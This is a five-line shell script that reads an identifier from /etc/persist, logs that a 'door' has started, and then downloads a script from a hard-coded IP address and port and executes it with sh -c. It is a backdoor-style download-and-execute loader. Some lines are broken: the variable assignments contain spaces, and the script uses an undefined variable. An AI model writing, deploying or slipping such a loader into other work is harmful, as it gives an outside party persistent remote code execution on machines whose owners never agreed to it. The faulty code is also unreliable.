#!/bin/sh
UUID = `cat /etc/persist`
BASE = "http://188.143.222.218:4455/?uuid="
logger -s "Started door with uid $UUID"
sh -c "$(wget -O- $BASE$NEW_UUID)"
